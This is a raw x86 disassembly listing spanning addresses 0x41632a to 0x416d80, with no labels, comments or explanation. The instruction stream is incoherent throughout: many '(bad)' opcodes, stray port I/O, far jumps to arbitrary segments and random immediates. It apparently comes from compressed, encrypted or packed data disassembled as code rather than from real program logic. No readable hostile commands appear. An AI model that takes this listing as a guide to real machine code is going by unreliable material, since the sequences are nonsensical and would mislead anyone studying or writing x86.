  41632a:	inc    eax
  41632b:	pop    esp
  41632c:	xchg   esp,eax
  41632d:	pop    eax
  41632e:	jge    0x416359
  416330:	inc    ebx
  416331:	mov    eax,0x4a88dc4e
  416336:	sbb    dh,BYTE PTR [esi-0x6f17d49b]
  41633c:	ds cmp esi,0xea749f5e
  416343:	pop    edx
  416344:	(bad)  
  416345:	leave  
  416346:	lods   eax,DWORD PTR ds:[esi]
  416347:	std    
  416348:	scas   eax,DWORD PTR es:[edi]
  416349:	add    eax,0xe4d25718
  41634e:	dec    edi
  41634f:	out    dx,al
  416350:	mov    ebp,eax
  416352:	inc    esp
  416353:	mov    es,WORD PTR [ebp+ecx*4-0x27575517]
  41635a:	xchg   edx,eax
  41635b:	dec    esi
  41635c:	xchg   ebp,eax
  41635d:	popa   
  41635e:	in     al,dx
  41635f:	shl    DWORD PTR [ecx+0x3a],0x81
  416363:	push   DWORD PTR [ebx+0x4c]
  416366:	div    DWORD PTR ss:[edi]
  416369:	sar    DWORD PTR [ebp+0x8c4cf23],1
  41636f:	in     al,dx
  416370:	mov    fs,WORD PTR [edx-0x26]
  416373:	enter  0x5da0,0xda
  416377:	test   BYTE PTR [ebx],ah
  416379:	add    esp,DWORD PTR [ecx]
  41637b:	loope  0x416314
  41637d:	pop    ss
  41637e:	dec    esi
  41637f:	(bad)  
  416380:	pop    edx
  416381:	cmp    BYTE PTR [edi+0x51f59c45],ah
  416387:	lds    edx,FWORD PTR [edi+eiz*8]
  41638a:	push   esi
  41638b:	mov    ebx,0xf742f77f
  416390:	jl     0x416321
  416392:	int    0xd6
  416394:	jmp    0x416393
  416396:	data16 sahf 
  416398:	cwde   
  416399:	scas   al,BYTE PTR es:[edi]
  41639a:	pop    edi
  41639b:	add    ecx,DWORD PTR [edi]
  41639d:	stos   DWORD PTR es:[edi],eax
  41639e:	je     0x4163d0
  4163a0:	dec    edx
  4163a1:	and    eax,0xcc28b052
  4163a6:	fsubr  QWORD PTR [ebx+0x69]
  4163a9:	js     0x416427
  4163ab:	cmp    eax,0x291dbdda
  4163b0:	repnz pop ecx
  4163b2:	add    DWORD PTR [ebp+0x30],ebp
  4163b5:	jmp    FWORD PTR [edx]
  4163b7:	mov    edi,es
  4163b9:	push   es
  4163ba:	adc    ebp,DWORD PTR [edx+ecx*8]
  4163bd:	sar    bl,1
  4163bf:	sbb    eax,0x6fa062b1
  4163c4:	js     0x416406
  4163c6:	rol    DWORD PTR [eax-0x77],0xb3
  4163ca:	mov    dl,BYTE PTR [esi+ebx*2-0x21]
  4163ce:	jg     0x416363
  4163d0:	mov    esp,0x8b451a71
  4163d5:	mov    BYTE PTR ds:0x6d8b7b91,dl
  4163db:	inc    ebx
  4163dc:	inc    DWORD PTR [esi]
  4163de:	gs inc ebp
  4163e0:	jge    0x416432
  4163e2:	int3   
  4163e3:	or     bh,ah
  4163e5:	pop    edx
  4163e6:	mov    eax,ds:0xe6e8f6f4
  4163eb:	pushf  
  4163ec:	inc    esp
  4163ed:	and    ebp,DWORD PTR [ebp+0x48]
  4163f0:	sbb    edx,DWORD PTR [ecx]
  4163f2:	loop   0x4163bd
  4163f4:	iret   
  4163f5:	push   esi
  4163f7:	ret    0x9194
  4163fa:	fistp  DWORD PTR [ebx]
  4163fc:	retf   
  4163fd:	or     BYTE PTR [ecx],ch
  4163ff:	dec    ecx
  416400:	aad    0x70
  416402:	dec    edi
  416403:	adc    DWORD PTR [ecx*8-0x17667d99],edx
  41640a:	xchg   edi,eax
  41640b:	mov    al,0xc1
  41640d:	xor    al,0x34
  41640f:	add    DWORD PTR [eax],0x0
	...
  416471:	add    BYTE PTR [eax],al
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	cmp    ah,al
  416482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416483:	js     0x4164c5
  416485:	jmp    0x416487
  416487:	add    BYTE PTR [ecx+eax*1],al
  41648a:	add    BYTE PTR [eax],al
  41648c:	repnz popf 
  41648e:	outs   dx,DWORD PTR ds:[esi]
  41648f:	stc    
  416490:	dec    ebp
  416491:	xchg   ecx,eax
  416492:	dec    ecx
  416493:	mov    edx,0x4cf598a5
  416498:	(bad)  
  416499:	popf   
  41649a:	out    0xcf,al
  41649c:	leave  
  41649d:	ret    0xb42e
  4164a0:	add    ch,BYTE PTR [edi]
  4164a2:	in     al,0x5d
  4164a4:	push   ebx
  4164a5:	mov    esp,0xa19f50d9
  4164aa:	push   0xde681a98
  4164af:	and    DWORD PTR [esi-0x548c9cc8],0xffffffa2
  4164b6:	ins    BYTE PTR es:[edi],dx
  4164b7:	or     eax,0xeba20c6a
  4164bc:	jb     0x416505
  4164be:	lods   eax,DWORD PTR ds:[esi]
  4164bf:	pop    ss
  4164c0:	in     al,dx
  4164c1:	int3   
  4164c2:	add    eax,0xafa8f022
  4164c7:	mov    edi,0x997fb16
  4164cc:	movntq (bad),mm7
  4164cd:	out    0xfd,eax
  4164cf:	pop    ecx
  4164d0:	mov    ah,BYTE PTR [eax]
  4164d2:	push   0xf85edaf5
  4164d7:	aam    0x2c
  4164d9:	ss xor cl,cl
  4164dc:	imul   esp,DWORD PTR [ecx-0x19],0x58
  4164e0:	dec    ecx
  4164e1:	adc    al,0x23
  4164e3:	xor    BYTE PTR [eax+0x4fedb199],dh
  4164e9:	std    
  4164ea:	(bad)  
  4164eb:	es mov bh,0xa4
  4164ee:	dec    esp
  4164ef:	or     DWORD PTR [eax+0x5],edx
  4164f2:	lds    edi,FWORD PTR [ecx+0x48]
  4164f5:	(bad)  [eax+ebp*1-0x9e414c4]
  4164fc:	push   cs
  4164fd:	sahf   
  4164fe:	dec    ebp
  4164ff:	mov    edx,0x9e53aac6
  416504:	push   esi
  416505:	sub    dl,ah
  416507:	lods   al,BYTE PTR ds:[esi]
  416508:	and    edx,edi
  41650a:	call   0x4855:0x103d5907
  416511:	push   0xffffffb4
  416513:	mov    WORD PTR [eax],fs
  416515:	jp     0x416535
  416517:	test   DWORD PTR [edx+0x3b],esi
  41651a:	xchg   ebx,eax
  41651b:	(bad)  
  41651c:	sub    al,BYTE PTR [esi]
  41651e:	loop   0x416531
  416520:	test   al,0x61
  416522:	and    ah,BYTE PTR [edi+0x19eb6f11]
  416528:	test   BYTE PTR [edx+ecx*2+0x7e],ah
  41652c:	cwde   
  41652d:	mov    edi,0x396a15ba
  416532:	fild   QWORD PTR fs:[eax-0x2c7251f0]
  416539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41653a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41653b:	data16 cmc 
  41653d:	inc    ebp
  41653e:	ds jmp 0x9a52:0x7b4203c7
  416546:	jae    0x416530
  416548:	fcom   DWORD PTR [ecx+0x17]
  41654b:	jne    0x416547
  41654d:	loop   0x41659c
  41654f:	(bad)  
  416550:	jmp    0xccb5:0x930a2a55
  416557:	push   cs
  416558:	(bad)  
  416559:	nop
  41655a:	icebp  
  41655b:	sbb    al,0xe0
  41655d:	xlat   BYTE PTR ds:[ebx]
  41655e:	fst    st(3)
  416560:	or     BYTE PTR [ecx],0x76
  416563:	cmp    BYTE PTR [ebp+0x3],0x51
  416567:	push   cs
  416568:	add    DWORD PTR [eax],0x4a05b820
  41656e:	lds    edx,FWORD PTR [ebp-0x55]
  416571:	pop    esi
  416572:	cmp    BYTE PTR [ebp+0x5],bl
  416575:	cld    
  416576:	mov    esi,0xf69e6b7e
  41657b:	sbb    esi,DWORD PTR [esi+0x18]
  41657e:	xor    eax,0x448e0c04
  416583:	inc    ebp
  416584:	fstp   QWORD PTR [edi+0x7a]
  416587:	(bad)
  41658a:	sub    dh,BYTE PTR [esi-0x38]
  41658d:	fstp   TBYTE PTR [ebp+0xf]
	...
  4165f4:	and    eax,0xfff32bd8
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0xbb04354]
  416601:	(bad)
  416604:	inc    esp
  416605:	in     al,dx
  416606:	add    BYTE PTR [eax],al
  416608:	add    al,0x1
  41660a:	add    BYTE PTR [eax],al
  41660c:	(bad)  
  41660d:	loopne 0x4165ce
  41660f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416610:	xchg   ecx,eax
  416611:	scas   al,BYTE PTR es:[edi]
  416612:	(bad)  
  416613:	pop    edx
  416615:	fadd   QWORD PTR [ecx+0x70]
  416618:	stos   DWORD PTR es:[edi],eax
  416619:	inc    ebp
  41661a:	fucom  st(5)
  41661c:	retf   0x7a04
  41661f:	mov    WORD PTR [edi],?
  416621:	repnz test DWORD PTR [edi-0x7e],0x4803369f
  416629:	sbb    BYTE PTR [esi+edx*1-0x597de5fe],ah
  416630:	inc    ebp
  416631:	sbb    DWORD PTR [ebx],esi
  416633:	xchg   ebp,eax
  416634:	and    eax,0x9d96606e
  416639:	rol    bl,0xd8
  41663c:	xor    DWORD PTR ds:0xa47b3d66,esi
  416642:	clc    
  416643:	xchg   ebp,eax
  416644:	in     al,0xf9
  416646:	ja     0x41661c
  416648:	xor    eax,0x37eaf5a1
  41664d:	(bad)  
  41664e:	jnp    0x4166c2
  416650:	inc    edx
  416651:	jl     0x4166a9
  416653:	xor    DWORD PTR [esi+eax*8],eax
  416656:	test   DWORD PTR [edi],0x4b00913a
  41665c:	push   ebp
  41665d:	aas    
  41665e:	xchg   DWORD PTR [edi+0x73533e62],eax
  416664:	sbb    edx,eax
  416666:	jb     0x4166ad
  416668:	out    0xd,eax
  41666a:	and    eax,DWORD PTR [esi-0x27]
  41666d:	sbb    DWORD PTR [eax+edx*2-0x2ddebae6],esi
  416674:	jg     0x4166a3
  416676:	outs   dx,DWORD PTR ds:[esi]
  416677:	aas    
  416678:	xchg   esp,eax
  416679:	pop    eax
  41667a:	and    eax,ebx
  41667c:	mov    esi,0xd00b1868
  416681:	mov    dl,0xa3
  416683:	sahf   
  416684:	daa    
  416685:	imul   eax,DWORD PTR [ebp+0x73],0x7d489cf8
  41668c:	cmp    DWORD PTR [ebx],ecx
  41668e:	shl    DWORD PTR [ebx],0x99
  416691:	fwait
  416692:	or     BYTE PTR [ebx+ebp*4],bh
  416695:	imul   ebp,DWORD PTR [edi-0x48],0x80c63aa1
  41669c:	imul   ah
  41669e:	fisttp WORD PTR [ebx-0x34da0aa5]
  4166a4:	aas    
  4166a5:	sub    DWORD PTR [ecx-0x317f9ff7],eax
  4166ab:	and    ch,BYTE PTR [ecx+eiz*2]
  4166ae:	gs iret 
  4166b0:	das    
  4166b1:	cmp    al,0xa5
  4166b3:	scas   al,BYTE PTR es:[edi]
  4166b4:	aad    0x26
  4166b6:	shr    DWORD PTR [eax],cl
  4166b8:	sbb    edi,eax
  4166ba:	xchg   DWORD PTR [esi+0x28],eax
  4166bd:	iret   
  4166be:	mov    ecx,0x6766437e
  4166c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166c4:	xor    eax,0x572ccaad
  4166c9:	shl    edi,1
  4166cb:	xchg   BYTE PTR [eax],dh
  4166cd:	ss cld 
  4166cf:	jmp    0x7bb21ef5
  4166d4:	xchg   ebp,eax
  4166d5:	or     BYTE PTR [ebp-0x5109b6e6],ch
  4166db:	shl    DWORD PTR ds:0xdba2fc30,cl
  4166e1:	in     eax,0xc6
  4166e3:	mov    cl,0x27
  4166e5:	cmp    ch,ah
  4166e7:	jne    0x416762
  4166e9:	mov    ah,0x5a
  4166eb:	xor    DWORD PTR [edx+0x1d1d1110],ebp
  4166f1:	adc    eax,0x9c0dc425
  4166f6:	push   ebp
  4166f7:	sbb    esi,ebx
  4166f9:	jmp    0x8436:0xe33fb980
  416700:	int3   
  416701:	or     ebx,DWORD PTR [edi]
  416703:	mov    al,ds:0x40dcde6e
  416708:	(bad)  
  416709:	dec    eax
  41670a:	push   edi
  41670b:	pop    ss
  41670c:	pop    ebx
  41670d:	mov    edi,0xefff
	...
  416772:	add    BYTE PTR [eax],al
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	sbb    ah,BYTE PTR [ebx]
  416782:	mov    ebp,DWORD PTR [ecx]
  416784:	dec    eax
  416785:	in     eax,dx
  416786:	add    BYTE PTR [eax],al
  416788:	add    al,0x1
  41678a:	add    BYTE PTR [eax],al
  41678c:	jb     0x41674f
  41678e:	rcr    DWORD PTR fs:[edx+ebp*2-0x46],0x16
  416794:	mov    ah,0xd
  416796:	sbb    eax,0xedf39ad7
  41679b:	arpl   WORD PTR [edi+ecx*4+0x21],ax
  41679f:	mov    ds:0x9918ea88,eax
  4167a4:	addr16 push es
  4167a6:	xlat   BYTE PTR ds:[ebx]
  4167a7:	mov    ah,dl
  4167a9:	sub    BYTE PTR [eax+0x6c1c1a14],dh
  4167af:	inc    ebp
  4167b0:	pop    ss
  4167b1:	adc    BYTE PTR [esi+0x71674df],ah
  4167b7:	pop    ebx
  4167b8:	clc    
  4167b9:	push   ebp
  4167ba:	mov    bh,0x67
  4167bc:	(bad)  
  4167bd:	mov    edi,0x9cf4c77e
  4167c2:	lahf   
  4167c3:	lods   al,BYTE PTR ds:[esi]
  4167c4:	lahf   
  4167c5:	push   es
  4167c6:	mov    edi,0x5b3eb873
  4167cb:	xchg   BYTE PTR gs:0x9803ad59,cl
  4167d2:	jp     0x41675a
  4167d4:	sub    BYTE PTR [edx+0x2],ch
  4167d7:	fs push esi
  4167d9:	in     al,0x36
  4167db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167dc:	inc    edx
  4167dd:	jp     0x41685b
  4167df:	mov    ds:0x991bda8e,eax
  4167e4:	cmp    ch,BYTE PTR [ebp+eiz*2+0x36]
  4167e8:	retf   
  4167e9:	lds    ebx,FWORD PTR [ecx+esi*4]
  4167ec:	mov    DWORD PTR [eax],esp
  4167ee:	cmp    eax,0xdaf0375b
  4167f3:	shl    DWORD PTR [eax+edi*2],cl
  4167f6:	sahf   
  4167f7:	ins    BYTE PTR es:[edi],dx
  4167f8:	mov    bh,0x9d
  4167fa:	stc    
  4167fb:	push   eax
  4167fc:	jo     0x41685b
  4167fe:	aad    0x7d
  416800:	stos   BYTE PTR es:[edi],al
  416801:	nop
  416802:	jecxz  0x4167cf
  416804:	push   ecx
  416805:	pop    eax
  416806:	jge    0x41682a
  416808:	jns    0x4167c0
  41680a:	xchg   BYTE PTR [esi+eax*8],ch
  41680d:	lods   al,BYTE PTR ds:[esi]
  41680e:	jmp    0x5707:0x901b3c14
  416815:	aam    0x8d
  416817:	jno    0x41680a
  416819:	lds    esp,FWORD PTR [edi-0x1d]
  41681c:	inc    eax
  41681d:	xchg   ecx,eax
  41681e:	in     eax,0xf0
  416820:	push   eax
  416821:	pop    es
  416822:	xor    bh,BYTE PTR [edx+0x4f]
  416825:	adc    ah,BYTE PTR [edx]
  416827:	cmc    
  416828:	loopne 0x416878
  41682a:	sbb    ecx,DWORD PTR [edi-0x4507dfcd]
  416830:	out    dx,al
  416831:	in     al,0xa7
  416833:	cdq    
  416834:	test   eax,0x92843d83
  416839:	xchg   ebx,eax
  41683a:	mov    esi,0x37a7a221
  41683f:	loop   0x4168a7
  416841:	out    0xc5,al
  416843:	test   al,0xf6
  416845:	fld    TBYTE PTR [edi+eax*1-0x62]
  416849:	enter  0x7c35,0xf
  41684d:	sbb    DWORD PTR [ebp+0x4a],esp
  416850:	xchg   esp,eax
  416851:	(bad)  
  416852:	ds pop ebp
  416854:	loope  0x41685f
  416856:	xchg   ebp,eax
  416857:	xor    DWORD PTR [ecx+eiz*8-0x25],ecx
  41685b:	inc    ebp
  41685c:	pop    esp
  41685d:	inc    esi
  41685e:	xor    dh,BYTE PTR [esi+esi*4+0x3bab2c0e]
  416865:	ins    BYTE PTR es:[edi],dx
  416866:	pop    ecx
  416867:	cdq    
  416868:	fcomp  st(0)
  41686a:	jno    0x416897
  41686c:	jmp    0x3407:0x5193b8ef
  416873:	add    ah,bl
  416875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416876:	retf   0xeeb0
  416879:	mov    DWORD PTR [esi+0x46],ecx
  41687c:	iret   
  41687d:	mov    ds:0x3e99f33c,eax
  416882:	push   0xffffffdb
  416884:	rcl    al,0x8f
  416887:	jo     0x416895
  416889:	inc    esi
  41688a:	outs   dx,DWORD PTR ds:[esi]
  41688b:	xor    BYTE PTR [eax],bh
  41688d:	leave  
  41688e:	pop    eax
  41688f:	mov    dh,0x0
	...
  4168f1:	add    BYTE PTR [eax],al
  4168f3:	add    cl,dl
  4168f5:	scas   eax,DWORD PTR es:[edi]
  4168f6:	push   es
  4168f7:	repz jle 0x4168f5
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x922809f7
  416904:	dec    esp
  416905:	out    dx,al
  416906:	add    BYTE PTR [eax],al
  416908:	add    al,0x1
  41690a:	add    BYTE PTR [eax],al
  41690c:	cli    
  41690d:	addr16 mov ebp,0x2270afd2
  416913:	repnz nop
  416915:	fucomi st,st(3)
  416917:	lahf   
  416918:	or     BYTE PTR [edx+ecx*1],0x6a
  41691c:	push   ebp
  41691d:	and    bh,dl
  41691f:	xor    DWORD PTR [edi+0x13a160c],edx
  416925:	shl    BYTE PTR [esi+0x12c1abb0],cl
  41692b:	xchg   ecx,eax
  41692c:	ret    
  41692d:	rcr    DWORD PTR [esi],1
  41692f:	pmaxsw mm0,QWORD PTR [esi+ecx*4]
  416933:	push   es
  416934:	mov    al,0x9a
  416936:	pop    ds
  416937:	addr16 out dx,al
  416939:	out    dx,eax
  41693a:	daa    
  41693b:	lock push esp
  41693d:	sbb    dl,bh
  41693f:	fcmovne st,st(1)
  416941:	pop    esi
  416942:	rol    BYTE PTR [edi+edx*4],0x28
  416946:	into   
  416947:	jae    0x4168f2
  416949:	stos   DWORD PTR es:[edi],eax
  41694a:	xlat   BYTE PTR ds:[ebx]
  41694b:	mov    BYTE PTR [ecx],bl
  41694d:	mov    eax,0x35ab47f3
  416952:	sbb    ebx,esi
  416954:	mov    DWORD PTR [esi-0x5952b34d],esp
  41695a:	xchg   DWORD PTR [eax],ebx
  41695c:	in     eax,0x7c
  41695e:	pop    ecx
  41695f:	jmp    0x2288:0x966344c1
  416966:	data16 cld 
  416968:	add    BYTE PTR [ecx],ah
  41696a:	sub    al,0xf8
  41696c:	jecxz  0x4169ce
  41696e:	repz fisub WORD PTR [esi+ebx*1+0x4b]
  416973:	mov    cl,0x6f
  416975:	cmp    al,0xf5
  416977:	sbb    dh,BYTE PTR [edx-0x2fe5482]
  41697d:	(bad)  
  41697e:	loopne 0x4169ed
  416980:	push   0xffffffc1
  416982:	mov    al,0x85
  416984:	sub    esp,DWORD PTR [edx]
  416986:	mov    edi,DWORD PTR [ebp+0x2e]
  416989:	or     eax,0x2853427d
  41698e:	jbe    0x416974
  416990:	fisttp WORD PTR [ebp-0xf]
  416993:	ret    
  416994:	leave  
  416995:	cmp    eax,0x871c0ca
  41699a:	imul   ebx,DWORD PTR [ebp+0x44b80542],0x2a
  4169a1:	imul   esi,DWORD PTR [ebp-0x72062a3d],0xffffffc4
  4169a8:	int3   
  4169a9:	xchg   esp,eax
  4169aa:	pusha  
  4169ab:	mov    ebp,0xcef174c9
  4169b0:	adc    ebp,ebp
  4169b2:	or     BYTE PTR [esi+ebx*1+0x79],0xa5
  4169b7:	jecxz  0x4169e5
  4169b9:	xor    al,0x90
  4169bb:	mov    al,ds:0xdd6ec4b7
  4169c0:	add    eax,DWORD PTR [edx+0x49e4e513]
  4169c6:	xor    BYTE PTR [ebp-0x22],dl
  4169c9:	mov    dl,0xfb
  4169cb:	push   cs
  4169cc:	ret    
  4169cd:	(bad)  
  4169ce:	jg     0x41695d
  4169d0:	and    al,0xaf
  4169d2:	enter  0x187c,0xd
  4169d6:	inc    esp
  4169d7:	(bad)  
  4169d8:	jae    0x416970
  4169da:	push   edx
  4169db:	rcl    BYTE PTR ds:0x311dae6f,0x8d
  4169e2:	gs ins DWORD PTR es:[edi],dx
  4169e4:	dec    ebp
  4169e5:	std    
  4169e6:	push   0x526d16fd
  4169eb:	xchg   ebp,eax
  4169ec:	xchg   edi,eax
  4169ed:	add    edx,esp
  4169ef:	lods   eax,DWORD PTR ds:[esi]
  4169f0:	mov    edx,0xac53537f
  4169f5:	ret    
  4169f6:	inc    ebp
  4169f7:	cmp    al,0xce
  4169f9:	ins    DWORD PTR es:[edi],dx
  4169fa:	rcl    DWORD PTR [edi-0xd],1
  4169fd:	inc    eax
  4169fe:	dec    DWORD PTR [ecx+0x72a54b88]
  416a04:	pop    ebx
  416a05:	arpl   si,cx
  416a07:	mov    WORD PTR [esi+0x9431d6f],es
  416a0d:	cs jno 0x4169fb
	...
  416a74:	retf   
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x4e210ba3
  416a82:	retf   0x5083
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    al,0x1
  416a8a:	add    BYTE PTR [eax],al
  416a8c:	fwait
  416a8d:	inc    ecx
  416a8e:	push   edx
  416a8f:	jb     0x416ad9
  416a91:	push   ebx
  416a92:	cdq    
  416a93:	ror    bh,cl
  416a95:	imul   eax,edx,0xffffffe4
  416a98:	mov    di,0x1379
  416a9c:	shr    BYTE PTR [edi+eiz*2],0xbe
  416aa0:	dec    esp
  416aa1:	jnp    0x416abe
  416aa3:	mov    cl,0x20
  416aa5:	mov    ah,0xb8
  416aa7:	xlat   BYTE PTR ds:[ebx]
  416aa8:	push   edi
  416aa9:	jae    0x416a63
  416aab:	nop
  416aac:	rol    al,0x34
  416aaf:	clc    
  416ab0:	xchg   ebp,eax
  416ab1:	mov    ch,0xea
  416ab3:	shl    BYTE PTR ds:0x762ae3e2,cl
  416ab9:	sbb    al,BYTE PTR [edi-0x3d]
  416abc:	jb     0x416b07
  416abe:	das    
  416abf:	sbb    bh,0x1e
  416ac2:	hlt    
  416ac3:	jo     0x416a88
  416ac5:	dec    edx
  416ac6:	int3   
  416ac7:	retf   
  416ac8:	cwde   
  416ac9:	xor    al,BYTE PTR [eax-0x48]
  416acc:	into   
  416acd:	sbb    ebp,ecx
  416acf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ad0:	push   ds
  416ad1:	cli    
  416ad2:	push   0x529c393d
  416ad7:	fsub   DWORD PTR [ebx-0x7a]
  416ada:	jo     0x416b0b
  416adc:	jp     0x416a67
  416ade:	aad    0xc8
  416ae0:	fld    TBYTE PTR [ecx+ecx*1+0x7e]
  416ae4:	mov    bh,0x4e
  416ae6:	cdq    
  416ae7:	js     0x416b14
  416ae9:	dec    ebx
  416aea:	leave  
  416aeb:	(bad)  [esi+0x383cf612]
  416af1:	mov    ch,0xb
  416af3:	adc    eax,0xed12db1f
  416af8:	xchg   ecx,eax
  416af9:	adc    BYTE PTR [eax+ebp*2+0xd],cl
  416afd:	or     eax,0xfcf66fd
  416b02:	xor    DWORD PTR [ecx],edi
  416b04:	mul    DWORD PTR [edx+0x51c8c50f]
  416b0a:	das    
  416b0b:	push   ds
  416b0c:	popf   
  416b0d:	mov    dh,0x2b
  416b0f:	test   eax,0x6da1dc30
  416b14:	cli    
  416b15:	mov    dl,0xd5
  416b17:	fwait
  416b18:	jno    0x416b54
  416b1a:	cld    
  416b1b:	mov    ebp,0x82b275e1
  416b20:	add    BYTE PTR [edi-0x7c],0x75
  416b24:	and    eax,0xc3ad302
  416b29:	fadd   DWORD PTR ds:0x69370cab
  416b2f:	inc    ecx
  416b30:	sbb    al,0xc3
  416b32:	cli    
  416b33:	sub    BYTE PTR [eax+0x14],ah
  416b36:	nop
  416b37:	pop    es
  416b38:	test   al,0xf4
  416b3a:	push   ebp
  416b3b:	popf   
  416b3c:	jmp    0xdbdd:0xc0bf9f9b
  416b43:	or     eax,0x57fe6843
  416b48:	jmp    0x12b2c19a
  416b4d:	cmp    eax,eax
  416b4f:	sub    esi,edx
  416b51:	fadd   st(5),st
  416b53:	xor    ah,bh
  416b55:	pop    ebx
  416b56:	mov    dh,0x54
  416b58:	outs   dx,DWORD PTR ds:[esi]
  416b59:	scas   al,BYTE PTR es:[edi]
  416b5a:	cmp    ebx,DWORD PTR [edi-0x1838c46a]
  416b60:	lock pop esp
  416b62:	dec    esp
  416b63:	add    ecx,esp
  416b65:	stc    
  416b66:	or     DWORD PTR [edi-0x6b5409d4],ecx
  416b6c:	jns    0x416b31
  416b6e:	add    BYTE PTR [ecx+0x44],al
  416b71:	test   DWORD PTR [ebp-0x16],esp
  416b74:	call   0xa17aafa2
  416b79:	(bad)  
  416b7a:	jo     0x416be0
  416b7c:	push   0xffffffac
  416b7e:	sub    cl,bl
  416b80:	cwde   
  416b81:	inc    ebp
  416b82:	into   
  416b83:	jg     0x416bff
  416b85:	popa   
  416b86:	lahf   
  416b87:	add    al,0x39
  416b89:	rcr    ch,0x6b
  416b8c:	sub    edx,esi
  416b8e:	das    
  416b8f:	xchg   esp,eax
	...
  416bf4:	jecxz  0x416c5b
  416bf6:	push   cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0xde5b70a9
  416c01:	push   0xf054d217
  416c06:	add    BYTE PTR [eax],al
  416c08:	add    al,0x1
  416c0a:	add    BYTE PTR [eax],al
  416c0c:	jp     0x416c7c
  416c0e:	or     eax,0x1089a69b
  416c13:	retf   0xbff2
  416c16:	ja     0x416c59
  416c18:	cmp    ch,BYTE PTR [edi]
  416c1a:	les    edi,FWORD PTR [esi+0x5d]
  416c1d:	cli    
  416c1e:	jb     0x416bdd
  416c20:	xchg   esi,eax
  416c21:	cmp    eax,0xf2687434
  416c26:	sbb    ebx,0x1f325ce7
  416c2c:	outs   dx,DWORD PTR ds:[esi]
  416c2d:	push   ss
  416c2e:	lods   eax,DWORD PTR ds:[esi]
  416c2f:	push   cs
  416c30:	stos   DWORD PTR es:[edi],eax
  416c31:	dec    ebx
  416c32:	shl    esp,0xb8
  416c35:	sub    eax,0x7493c7fa
  416c3a:	jnp    0x416c84
  416c3c:	dec    esi
  416c3d:	pusha  
  416c3e:	test   eax,0x1ea23a4c
  416c43:	mov    edi,0xad84dd5a
  416c48:	into   
  416c49:	mov    ebx,0x927c735b
  416c4e:	out    0x23,eax
  416c50:	call   0x5439:0x3010f713
  416c57:	xchg   esi,eax
  416c58:	and    bh,BYTE PTR [ebx-0x24]
  416c5b:	in     al,dx
  416c5c:	or     esi,DWORD PTR [esi]
  416c5e:	retf   
  416c5f:	cmp    al,0xe6
  416c61:	cli    
  416c62:	jp     0x416cdf
  416c64:	cwde   
  416c65:	ficom  WORD PTR [edx+eax*4]
  416c68:	jmp    DWORD PTR [edx+0x4c]
  416c6b:	fcomp  DWORD PTR [eax-0x2ad76f48]
  416c71:	das    
  416c72:	sar    ebx,0x9c
  416c75:	inc    edi
  416c76:	mov    edx,0xb9a654b
  416c7b:	adc    al,0x82
  416c7d:	int    0x7d
  416c7f:	pusha  
  416c80:	xchg   esi,eax
  416c81:	daa    
  416c82:	jae    0x416c87
  416c84:	and    al,0x65
  416c86:	imul   ebp,esp,0xa35d8188
  416c8c:	out    dx,al
  416c8d:	cmp    BYTE PTR [ebp+0x1f],0xe8
  416c91:	aad    0xcc
  416c93:	daa    
  416c94:	pop    es
  416c95:	mov    eax,ds:0x3ad05766
  416c9a:	xor    edi,DWORD PTR [eax+0x1a941833]
  416ca0:	lock sar BYTE PTR [ebx+0x1f],1
  416ca4:	ja     0x416cd1
  416ca6:	jmp    0x416d14
  416ca8:	inc    ecx
  416ca9:	pop    ds
  416caa:	adc    BYTE PTR [eax],cl
  416cac:	leave  
  416cad:	clc    
  416cae:	sbb    edi,DWORD PTR [ebp-0x1050cc78]
  416cb4:	cmc    
  416cb5:	mov    ebp,0x888a08b1
  416cba:	push   ecx
  416cbb:	out    dx,al
  416cbc:	cmp    eax,0x20e6a006
  416cc1:	jmp    0x128ecac4
  416cc6:	div    DWORD PTR [edx+0x2]
  416cc9:	call   0xf6269b71
  416cce:	lods   eax,DWORD PTR ds:[esi]
  416ccf:	into   
  416cd0:	pop    ss
  416cd1:	mov    edx,0xb0d37ba2
  416cd6:	shl    DWORD PTR [ebp-0x12],cl
  416cd9:	inc    ebp
  416cda:	ror    BYTE PTR [esi+0x378297df],cl
  416ce0:	cld    
  416ce1:	push   edx
  416ce2:	xchg   DWORD PTR [ecx+0x17],ebp
  416ce5:	jb     0x416d11
  416ce7:	bnd ja 0x416c83
  416cea:	cwde   
  416ceb:	out    0x40,al
  416ced:	outs   dx,DWORD PTR ds:[esi]
  416cee:	jecxz  0x416ccd
  416cf0:	bound  eax,QWORD PTR [eax-0x3eab5200]
  416cf6:	neg    DWORD PTR [ebx+0xdd7f875]
  416cfc:	fld    TBYTE PTR [edx-0x62]
  416cff:	pop    eax
  416d00:	mov    esi,0xa624d296
  416d05:	jecxz  0x416d06
  416d07:	jnp    0x416ce0
  416d09:	rcl    DWORD PTR [ebx+ebp*1-0x27],cl
  416d0d:	adc    ebx,ecx
  416d0f:	lock add BYTE PTR [eax],al
	...
  416d72:	add    BYTE PTR [eax],al
  416d74:	and    DWORD PTR [ebx-0x40445077],edx
  416d7a:	daa    
  416d7b:	lahf   
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	add    BYTE PTR [edi-0xea79402],0x0
